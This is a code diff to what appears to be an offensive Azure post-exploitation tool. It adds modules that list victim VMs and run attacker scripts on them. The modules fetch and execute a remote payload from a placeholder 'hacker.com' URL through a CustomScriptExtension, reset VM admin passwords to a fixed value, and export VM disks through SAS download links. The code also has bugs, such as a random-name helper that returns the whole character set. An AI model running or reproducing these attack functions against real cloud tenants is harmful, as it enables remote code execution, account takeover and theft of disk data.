@@ -4,8 +4,11 @@ import base64
 import json, sys
 import uuid
 import os
+import random
+import string
 from prettytable import PrettyTable
 import subprocess
+from urllib.parse import urlparse
 
 Token = None
 accessTokenGraph = None
@@ -43,9 +46,14 @@ class SimpleCompleter(object):
             response = None
         return response
 
+def get_random_string(size):
+    chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
+    ''.join(random.choice(chars) for _ in range(size))
+    return chars
+
 def parseUPN():
-    global accessTokenGraph, Token
-    if accessTokenGraph is None or Token is None:
+    global Token
+    if Token is None:
         print("No Token has been set.")
     else:
         b64_string = Token.split(".")[1]
@@ -53,27 +61,36 @@ def parseUPN():
         return json.loads(base64.b64decode(b64_string))['upn']
 
 def parseUPNObjectId():
-    global accessTokenGraph, Token
-    if accessTokenGraph is None or Token is None:
+    global Token
+    if Token is None:
         print("No Token has been set.")
     else:
         b64_string = Token.split(".")[1]
         b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
         return json.loads(base64.b64decode(b64_string))['oid']
 def hasTokenInPlace():
-    global accessTokenGraph, Token
-    if accessTokenGraph is None or Token is None:
+    global Token
+    if Token is None:
         return False
     else:
         return True
 
 def setToken(token):
-    global Token
-    Token = token
+    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
+    if token == "":
+        hasMgmtAccess = False
+        hasGraphAccess = False
+        hasVaultEnabled = False
+    else:
+        Token = token
 
 
-def initToken(token):
-    global Token
+def initToken(token, resetscopes):
+    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
+    if resetscopes:
+        hasMgmtAccess = False
+        hasGraphAccess = False
+        hasVaultEnabled = False
     Token = token
 
 
@@ -93,22 +110,24 @@ def originitToken(token):
 
 def currentScope():
     global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
-    global accessTokenGraph, Token
-    if accessTokenGraph is None or Token is None:
+    global Token
+    if Token is None:
         print("No Token has been set.")
     else:
+        check = Token.split(".")[1]
+        audAttribue = json.loads(base64.b64decode(check))['aud']
         strA = []
-        if hasGraphAccess:
+        if hasGraphAccess or "graph.microsoft.com" in audAttribue:
             strA.append("Graph enabled")
-        if hasMgmtAccess:
+        if hasMgmtAccess or "management.azure.com" in audAttribue:
             strA.append("Azure RABC enabled")
-        if hasVaultEnabled:
+        if hasVaultEnabled or 'vault.azure.net' in audAttribue:
             strA.append("Vault enabled")
         print("Enabled Scope(s): " + str(" | ").join(strA))
 
 def currentProfile():
-    global accessTokenGraph, Token
-    if accessTokenGraph is None or Token is None:
+    global Token
+    if Token is None:
         print("No Token has been set.")
     else:
         strigify = parseUPN().split("@")
@@ -235,6 +254,19 @@ def RD_ListAllACRs():
         return r.json()
     return False
 
+def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", headers=headers)
+    if rs.status_code == 200:
+        return rs.json()['statuses'][1]['code']
+    else:
+        print(rs.json())
+        return "Unable to fetch VM data."
+
 def RD_ListAllVMs():
     global Token
     result = []
@@ -247,10 +279,109 @@ def RD_ListAllVMs():
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", headers=headers)
             for item in rsVM.json()['value']:
+                if 'identity' not in item:
+                    item['identity'] = "N/A"
+
                 item['subscriptionId'] = sub['subscriptionId']
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
+def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2021-12-01",
+                      json={
+                          "access": "Read",
+                          "durationInSeconds": 300
+                      },
+                      headers=headers)
+    if rs.status_code == 200:
+        DownloadURL = rs.json()['access']
+        return "Ready! SAS Download Link for " + vmDiskName + ": " + DownloadURL
+    else:
+        return "Unable to create SAS Download Link."
+
+def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    vmExtensionName = get_random_string(20)
+    r = requests.put(
+        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/" + resourceGroupName + "/providers/Microsoft.Compute/virtualMachines/" + vmName + "/extensions/" + vmExtensionName + "?api-version=2022-08-01",
+        json={
+            "location": location,
+            "properties": {
+                "publisher": "Microsoft.Compute",
+                "typeHandlerVersion": "1.0",
+                "type": "CustomScriptExtension",
+                "autoUpgradeMinorVersion": True,
+                "protectedSettings": {
+                    "commandToExecute": os.path.basename(urlparse(PayloadURL).path),
+                    "fileUris": [PayloadURL]
+                }
+            }
+        },
+        headers=headers)
+    if r.status_code == 201:
+        return "Created! It should be ready within 5-10 min."
+    else:
+        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])
+
+def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command):
+    global Token
+    headers = {
+        'Content-Type': 'text/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    if osType == "Windows":
+        exec = "RunPowerShellScript"
+    else:
+        exec = "RunShellScript"
+
+    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",
+        json={
+            "commandId": exec,
+            "script": [Command]
+        }, headers=headers)
+
+    if rs.status_code == 202 or rs.status_code == 200:
+        return "Successfully Created Shell Script."
+    else:
+        return "Failed to Create Shell Script."
+
+
+
+def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, vmExtensionName, adminAccount):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    vmExtensionName = get_random_string(20)
+    r = requests.put(
+        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/extensions/"+vmExtensionName+"?api-version=2022-08-01",
+        json={
+              "location": location,
+              "properties": {
+                "publisher": "Microsoft.Compute",
+                "typeHandlerVersion": "2.0",
+                "type": "VMAccessAgent",
+                "autoUpgradeMinorVersion": True,
+                "protectedSettings": {
+                    "password": "secretPass123"
+                }
+              }
+            },
+        headers=headers)
+    if r.status_code == 201:
+        return "Created! It should be ready within 5-10 min. \nLogin to "+vmName+" using " + adminAccount + ":secretPass123 as login details."
+    else:
+        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])
 
 def RD_ListAutomationAccounts():
     global Token
@@ -511,7 +642,10 @@ def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
         "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01",
         headers=headers)
     if r.status_code == 200:
-        result = r.json()['properties']['ipAddress']
+        if "ipAddress" not in r.json()['properties']:
+            result = "N/A"
+        else:
+            result = r.json()['properties']['ipAddress']
     else:
         result = "N/A"
     return result
@@ -612,9 +746,15 @@ def attackWindow():
         "Reader/ListAutomationAccounts",
         "Reader/DumpAllRunBooks",
         "Reader/ListAllRunBooks",
+        "Reader/ListVirtualMachines",
         "Reader/ARMTemplatesDisclosure",
         "Reader/ListServicePrincipal",
         "Reader/abuseServicePrincipals",
+        "Contributor/RunCommandVM",
+        "Contributor/VMExtensionResetPwd",
+        "Contributor/VMExtensionExecution",
+        "Contributor/VMDiskExport",
+        "Contributor/VMDiskSnapshotExport",
         "GlobalAdministrator/elevateAccess"
     ]
     readline.set_completer(SimpleCompleter(exploits).complete)
@@ -795,11 +935,11 @@ def attackWindow():
                 setToken("")
             elif "Token/GenToken" in ExploitChoosen and mode == "run":
                 print("Trying getting token automatically for you...")
-                initToken(tryGetToken())
+                initToken(tryGetToken(), False)
             elif "Token/SetToken" in ExploitChoosen and mode == "run":
                 print("Please paste your Azure token here:")
                 token = input("Enter Token:")
-                initToken(token)
+                initToken(token, True)
                 print("All set.")
             elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all external-facing Azure Service Apps..")
@@ -888,8 +1028,15 @@ def attackWindow():
                 AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
                 AllVMRecordsCount = 0
                 for UserVMRecord in RD_ListAllVMs():
-                    AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name']), UserVMRecord['resourceGroup'], UserVMRecord['identity']['type'], UserVMRecord['subscriptionId']])
-                    AllVMRecordsCount += 1
+                    if UserVMRecord['identity'] == "N/A":
+                        VMIdentity = "N/A"
+                    else:
+                        VMIdentity = UserVMRecord['identity']['type']
+                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], "N/A", UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
+                    else:
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name']), UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
+                        AllVMRecordsCount += 1
                 print(AllVMRecords)
             elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all service principles (App registrations)..")
@@ -917,6 +1064,100 @@ def attackWindow():
                                                 EntAppsRecord['publisherDomain'],pwdGen])
                     EntAppsRecordsCount += 1
                 print(EntAppsRecords)
+            elif "Contributor/RunCommandVM" in ExploitChoosen and mode == "run":
+                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
+                victims = {}
+                AllVMRecords = PrettyTable()
+                AllVMRecords.align = "l"
+                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "OSType", "ResourceGroup","SubscriptionId"]
+                AllVMRecordsCount = 0
+                for UserVMRecord in RD_ListAllVMs():
+                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
+                        continue
+                    else:
+                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],"os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
+                                              UserVMRecord['resourceGroup'],
+                                              UserVMRecord['subscriptionId']])
+                        AllVMRecordsCount += 1
+                print(AllVMRecords)
+                TargetVM = input("Select Target VM Name [i.e. 1]: ")
+                Selection = int(TargetVM)
+                CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
+                with open(os.path.normpath(CmdVMPath)) as f:
+                    CmdFileContent = f.read()
+                print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
+            elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
+                print("Trying to list offline virtual machines.. (it might take a few minutes)")
+                victims = {}
+                AllVMRecords = PrettyTable()
+                AllVMRecords.align = "l"
+                AllVMRecords.field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
+                AllVMRecordsCount = 0
+                for UserVMRecord in RD_ListAllVMs():
+                        VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
+                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], UserVMRecord['properties']['storageProfile']['osDisk']['name'], VMState])
+                        AllVMRecordsCount += 1
+                print(AllVMRecords)
+                TargetVM = input("Select Target DiskVM [i.e. 1]: ")
+                print("Create a SAS link for VHD download...")
+                Selection = int(TargetVM)
+                print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
+
+            elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
+                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
+                victims = {}
+                AllVMRecords = PrettyTable()
+                AllVMRecords.align = "l"
+                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
+                                            "SubscriptionId"]
+                AllVMRecordsCount = 0
+                for UserVMRecord in RD_ListAllVMs():
+                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
+                                           UserVMRecord['name']) == "N/A":
+                        continue
+                    else:
+                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                      "username": UserVMRecord['properties']['osProfile'][
+                                                          'adminUsername'], "location": UserVMRecord['location'],
+                                                      "subId": UserVMRecord['subscriptionId'],
+                                                      "rg": UserVMRecord['resourceGroup']}
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],
+                                              HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
+                                                                  UserVMRecord['resourceGroup'], UserVMRecord['name']),
+                                              UserVMRecord['properties']['osProfile']['adminUsername'],
+                                              UserVMRecord['resourceGroup'],
+                                              UserVMRecord['subscriptionId']])
+                        AllVMRecordsCount += 1
+                print(AllVMRecords)
+                TargetVM = input("Select Target VM Name [i.e. 1]: ")
+                RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
+                Selection = int(TargetVM)
+                print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
+                                              victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))
+
+            elif "Contributor/VMExtensionResetPwd" in ExploitChoosen and mode == "run":
+                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
+                victims = {}
+                AllVMRecords = PrettyTable()
+                AllVMRecords.align = "l"
+                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP",  "adminUsername", "ResourceGroup", "SubscriptionId"]
+                AllVMRecordsCount = 0
+                for UserVMRecord in RD_ListAllVMs():
+                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
+                        continue
+                    else:
+                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "username": UserVMRecord['properties']['osProfile']['adminUsername'], "location": UserVMRecord['location'], "subId": UserVMRecord['subscriptionId'], "rg": UserVMRecord['resourceGroup']}
+                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']),
+                                              UserVMRecord['properties']['osProfile']['adminUsername'], UserVMRecord['resourceGroup'],
+                                              UserVMRecord['subscriptionId']])
+                        AllVMRecordsCount += 1
+                print(AllVMRecords)
+                TargetVM = input("Select Target VM Name [i.e. 1]: ")
+                Selection = int(TargetVM)
+                print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], "RandomExtNas", victims[Selection]["username"]))
+
             elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                 print("Elevating access to the root management group..")
                 print(GA_ElevateAccess())
